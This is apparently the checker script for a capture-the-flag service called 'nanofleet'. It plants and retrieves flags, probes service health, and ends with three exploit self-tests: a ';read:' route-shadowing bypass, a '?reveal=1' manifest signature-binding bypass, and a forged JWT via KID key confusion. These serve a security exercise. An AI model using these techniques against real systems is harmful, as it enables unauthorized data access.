from __future__ import annotations

import json
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher
from httpx import AsyncClient

from client import (
    encode_jwt,
    ensure_status,
    json_or_mumble,
    post_task,
    rnd,
)


checker = Enochecker("nanofleet", 8080)
app = lambda: checker.app


# -----------------------------------------------------------------------------
# variant 0 — drone telemetry node (route shadowing)
# -----------------------------------------------------------------------------

@checker.putflag(0)
async def putflag_route(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 0, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_route: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 0:
        raise MumbleException("putflag_route: wrong variant")
    for field in ("a", "b"):
        if field not in info:
            raise MumbleException(f"putflag_route: missing {field}")
    await db.set("v0", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(0)
async def getflag_route(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v0")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_route: flag drift")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        0,
        flag=task.flag,
        attack_info=json.dumps(saved["info"]),
    )
    catalog = await client.get("/api/nodes")
    await ensure_status(catalog, 200, "getflag_route catalog")
    body = await json_or_mumble(catalog, "getflag_route catalog")
    if not any(node.get("id") == saved["info"]["a"] for node in body.get("nodes", [])):
        raise MumbleException("getflag_route: secret node missing from catalog")


# -----------------------------------------------------------------------------
# variant 1 — firmware manifest (signature-binding bug on ?reveal=1)
# -----------------------------------------------------------------------------

@checker.putflag(1)
async def putflag_manifest(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 1, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_manifest: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 1:
        raise MumbleException("putflag_manifest: wrong variant")
    await db.set("v1", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(1)
async def getflag_manifest(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v1")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_manifest: flag drift")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        1,
        flag=task.flag,
        attack_info=json.dumps(saved["info"]),
    )
    issue = await client.get("/api/v2/firmware/issue", params={"blob": "public-blob"})
    await ensure_status(issue, 200, "getflag_manifest public issue")
    body = await json_or_mumble(issue, "getflag_manifest public issue")
    if "." not in str(body.get("manifest", "")):
        raise MumbleException("public manifest token has wrong shape")
    read = await client.get(
        "/api/v2/firmware/read",
        params={"manifest": body["manifest"], "blob": "public-blob"},
    )
    await ensure_status(read, 200, "getflag_manifest public read")
    body2 = await json_or_mumble(read, "getflag_manifest public read")
    if body2.get("kind") != "public":
        raise MumbleException("public firmware read drift")


# -----------------------------------------------------------------------------
# variant 2 — diagnostic JWT (KID key-confusion)
# -----------------------------------------------------------------------------

@checker.putflag(2)
async def putflag_diagnostic(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 2, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_diagnostic: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 2:
        raise MumbleException("putflag_diagnostic: wrong variant")
    await db.set("v2", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(2)
async def getflag_diagnostic(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v2")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_diagnostic: flag drift")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        2,
        flag=task.flag,
        attack_info=json.dumps(saved["info"]),
    )


# -----------------------------------------------------------------------------
# noise
# -----------------------------------------------------------------------------

@checker.putnoise(0)
async def putnoise_route(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 0)


@checker.getnoise(0)
async def getnoise_route(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 0)


@checker.putnoise(1)
async def putnoise_manifest(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 1)


@checker.getnoise(1)
async def getnoise_manifest(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 1)


@checker.putnoise(2)
async def putnoise_diagnostic(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 2)


@checker.getnoise(2)
async def getnoise_diagnostic(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 2)


# -----------------------------------------------------------------------------
# havoc — exercise the public surface
# -----------------------------------------------------------------------------

@checker.havoc(0)
async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    health = await client.get("/health")
    await ensure_status(health, 200, "havoc health")
    whoami = await client.get("/whoami")
    await ensure_status(whoami, 200, "havoc whoami")


@checker.havoc(1)
async def havoc_nodes(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    r = await client.get("/api/nodes")
    await ensure_status(r, 200, "havoc nodes")
    body = await json_or_mumble(r, "havoc nodes")
    nodes = body.get("nodes") or []
    if not nodes:
        raise MumbleException("node catalog empty")
    if not any(node.get("id") == "public-drone" for node in nodes):
        raise MumbleException("public-drone missing from catalog")


@checker.havoc(2)
async def havoc_routes(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    tok = await client.get("/api/routes/diag-token")
    await ensure_status(tok, 200, "havoc routes token")
    body = await json_or_mumble(tok, "havoc routes token")
    token = str(body.get("token", ""))
    if "." not in token or len(token) < 20:
        raise MumbleException("route token shape drift")
    diag = await client.get("/api/route/diag", params={"token": token})
    await ensure_status(diag, 200, "havoc routes diag")
    body2 = await json_or_mumble(diag, "havoc routes diag")
    if not isinstance(body2.get("results"), list):
        raise MumbleException("route diag results missing")


@checker.havoc(3)
async def havoc_register(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    label = f"hv-{rnd(6)}"
    reg = await client.post("/api/v2/agent/register", json={"label": label})
    await ensure_status(reg, 200, "havoc register")
    body = await json_or_mumble(reg, "havoc register")
    node = body.get("node") or {}
    if not node.get("id") or not node.get("blob"):
        raise MumbleException("register response missing id/blob")
    sched = await client.post(
        "/api/v2/jobs",
        json={"node": node["id"], "template": f"noop-{rnd(4)}"},
    )
    await ensure_status(sched, 200, "havoc schedule")
    body2 = await json_or_mumble(sched, "havoc schedule")
    job = body2.get("job") or {}
    if job.get("state") != "SUCCESS":
        raise MumbleException("schedule did not return SUCCESS")
    read = await client.get(f"/api/v2/jobs/{job.get('id')}")
    await ensure_status(read, 200, "havoc job read")


@checker.havoc(4)
async def havoc_firmware(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    issue = await client.get("/api/v2/firmware/issue", params={"blob": "public-blob"})
    await ensure_status(issue, 200, "havoc firmware issue")
    body = await json_or_mumble(issue, "havoc firmware issue")
    manifest = str(body.get("manifest", ""))
    if "." not in manifest:
        raise MumbleException("firmware manifest shape drift")
    read = await client.get(
        "/api/v2/firmware/read",
        params={"manifest": manifest, "blob": "public-blob"},
    )
    await ensure_status(read, 200, "havoc firmware read")
    body2 = await json_or_mumble(read, "havoc firmware read")
    if body2.get("kind") != "public":
        raise MumbleException("public firmware read drift")


@checker.havoc(5)
async def havoc_ops(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    r = await client.get("/api/jwt/inspect")
    await ensure_status(r, 200, "havoc ops jwt")
    body = await json_or_mumble(r, "havoc ops jwt")
    if body.get("accepted") is not False:
        raise MumbleException("jwt inspect drift")


# -----------------------------------------------------------------------------
# exploit self-tests
# -----------------------------------------------------------------------------

@checker.exploit(0)
async def exploit_route(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 0:
        raise InternalErrorException("exploit_route: wrong variant")
    tok = await client.get("/api/routes/diag-token")
    await ensure_status(tok, 200, "exploit_route token")
    token = (await json_or_mumble(tok, "exploit_route token")).get("token")
    if not token:
        raise MumbleException("exploit_route: missing diag token")
    r = await client.get(
        f"/api/route/diag;read:{info['a']}",
        params={"token": token},
    )
    await ensure_status(r, 200, "exploit_route shadow")
    body = await json_or_mumble(r, "exploit_route shadow")
    for item in body.get("results", []):
        flag = searcher.search_flag(json.dumps(item))
        if flag:
            return flag
    raise MumbleException("exploit_route: flag not found")


@checker.exploit(1)
async def exploit_manifest(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 1:
        raise InternalErrorException("exploit_manifest: wrong variant")
    issue = await client.get("/api/v2/firmware/issue", params={"blob": "public-blob"})
    await ensure_status(issue, 200, "exploit_manifest public issue")
    manifest = (await json_or_mumble(issue, "exploit_manifest public issue")).get("manifest")
    if not manifest:
        raise MumbleException("exploit_manifest: missing public manifest")
    r = await client.get(
        "/api/v2/firmware/read",
        params={"manifest": manifest, "blob": info["b"], "reveal": "1"},
    )
    await ensure_status(r, 200, "exploit_manifest reveal")
    body = await json_or_mumble(r, "exploit_manifest reveal")
    flag = searcher.search_flag(str(body.get("payload", "")))
    if not flag:
        raise MumbleException("exploit_manifest: flag missing from payload")
    return flag


@checker.exploit(2)
async def exploit_diagnostic(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 2:
        raise InternalErrorException("exploit_diagnostic: wrong variant")
    label = f"exp-{rnd(6)}"
    reg = await client.post("/api/v2/agent/register", json={"label": label})
    await ensure_status(reg, 200, "exploit_diagnostic register")
    node = (await json_or_mumble(reg, "exploit_diagnostic register")).get("node") or {}
    if not node.get("id") or not node.get("blob"):
        raise MumbleException("exploit_diagnostic: registration response missing fields")
    token = encode_jwt(
        "KID",
        node["id"],
        node["blob"],
        {"node": info["a"], "scope": "read"},
    )
    r = await client.get("/api/v2/jobs/diagnostic", params={"token": token})
    await ensure_status(r, 200, "exploit_diagnostic payload")
    body = await json_or_mumble(r, "exploit_diagnostic payload")
    flag = searcher.search_flag(str(body.get("payload", "")))
    if not flag:
        raise MumbleException("exploit_diagnostic: flag missing from payload")
    return flag
